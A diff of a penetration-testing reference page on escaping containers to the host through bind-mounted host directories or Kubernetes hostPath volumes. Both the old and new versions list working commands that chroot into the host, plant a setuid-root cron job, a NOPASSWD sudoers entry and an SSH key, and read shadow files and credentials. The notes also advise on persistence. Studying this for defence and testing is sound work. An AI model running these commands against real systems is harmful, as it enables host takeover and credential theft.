@@ -1,43 +1,54 @@
 ---
-title: "Host path mount: escaping through a bind-mounted host directory"
-description: "Escaping a container to the host through a host filesystem path bound into the container, most powerfully the whole root filesystem, which gives direct read and write of host files and lets an attacker plant an SSH key, a cron job, or a setuid binary to execute on the host."
+title: "Host path mount: using a bind-mounted host directory to reach the host"
+description: "A container given a bind mount of a host directory, or the entire host root at a path like /host, can read and write those host files directly. Depending on which directory is exposed, an attacker reads secrets, writes a cron job or SSH key, edits a systemd unit, or escalates through a mounted /etc or /root, with the full host root being an immediate takeover."
 keywords:
-  - host path mount
-  - bind mount escape
-  - docker volume escape
-  - hostPath
+  - hostpath mount
+  - bind mount
+  - host filesystem
+  - kubernetes hostpath
   - container escape
 ---
 
 # Host path mount
 
-When a host directory is bind-mounted into a container, the container reads and writes that path on the host directly, with no namespace in the way. The strongest case is the whole root filesystem (`-v /:/host`), common in CI runners, backup sidecars, and "management" containers. Enumerate mounts first:
+A bind mount maps a host directory into the container, and the files behind it are the host's real files, not copies. The escape severity depends entirely on which directory was mounted and whether it is writable. A mount of the whole host root at `/host` is an immediate takeover; a narrower mount of `/etc`, `/root`, `/var/run`, or a cloud credentials directory is often just as good because of what those directories let you overwrite or read. In Kubernetes this is a `hostPath` volume, one of the most common pod-to-node escapes.
+
+Find the host mount and test writability:
 
 ```bash
-cat /proc/self/mountinfo        # look for host paths, especially / mounted read-write
-mount | grep -vE 'proc|sysfs|tmpfs|cgroup'
+findmnt -o TARGET,SOURCE,OPTIONS | grep -vE 'overlay|tmpfs|proc|sysfs|cgroup'
+# a line whose SOURCE is a host subtree (e.g. /var/lib/..[/host/etc]) is a bind mount
+ls -la /host 2>/dev/null; touch /host/etc/.w 2>/dev/null && echo writable
 ```
 
-With the host root mounted read-write, you own the host:
+## Routes by what is mounted
 
 ```bash
-# Chroot into the host filesystem and act as root there
-chroot /host sh
+# Full host root at /host: chroot straight in
+chroot /host /bin/bash
 
-# Or without chroot, write host files directly
-echo 'ssh-ed25519 AAAA... attacker' >> /host/root/.ssh/authorized_keys
-echo '* * * * * root cp /bin/bash /tmp/b && chmod 4755 /tmp/b' > /host/etc/cron.d/x
+# Host /etc writable: schedule a root job or grant sudo
+echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host/cron.d/w
+echo 'nobody ALL=(ALL) NOPASSWD: ALL' > /host/sudoers.d/w
+
+# Host /root or a user home: plant an SSH key
+mkdir -p /host/root/.ssh && echo 'ssh-ed25519 AAAA... a' >> /host/root/.ssh/authorized_keys
+
+# Host /var/run or /run: often contains the container runtime socket
+ls -l /host/var/run/docker.sock       # pivot to the runtime-socket route
+
+# Read-only mount: still valuable for secrets
+cat /host/etc/shadow /host/root/.ssh/id_* /host/etc/kubernetes/admin.conf 2>/dev/null
 ```
-
-Even a partial mount is useful: `/etc` lets you add a user or cron job, a mounted Docker or kubelet directory leaks credentials, and a mounted log directory can be a symlink primitive into the host. Read-only mounts still leak secrets (keys, tokens, configs) for use elsewhere.
 
 ## Exploitation notes
 
-- A read-write host-root mount is immediate host takeover; prefer a cron job or SSH key over chroot if you need persistence rather than an interactive shell.
-- In Kubernetes this is the `hostPath` volume; a pod that can mount `hostPath: /` reaches the node the same way, as the pod-delivery view in [Pod escape to node](../../orchestration/kubernetes/pod-escape-to-node/hostpath-mount.md).
-- A mounted `/var/run/docker.sock` is a special case covered under [Runtime socket mount](runtime-socket-mount.md).
+- A read-only host mount blocks writes but still exposes secrets; prioritise private keys, `/etc/shadow`, kubeconfig and kubelet files, and cloud credential files for onward movement.
+- Prefer a deterministic persistence write (cron, sudoers, authorized_keys) over editing a live binary or config that a running service holds open.
+- In Kubernetes, a `hostPath` of `/` or `/var/lib/kubelet` is a node takeover; see [hostPath mount](../../../orchestration/kubernetes/pod-escape-to-node/hostpath-mount.md) for the pod-delivery view.
 
 ## References
 
-- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
+- [BishopFox: bad pods / hostPath](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
 - [Kubernetes: hostPath volumes](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
+- [HackTricks: sensitive mounts](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
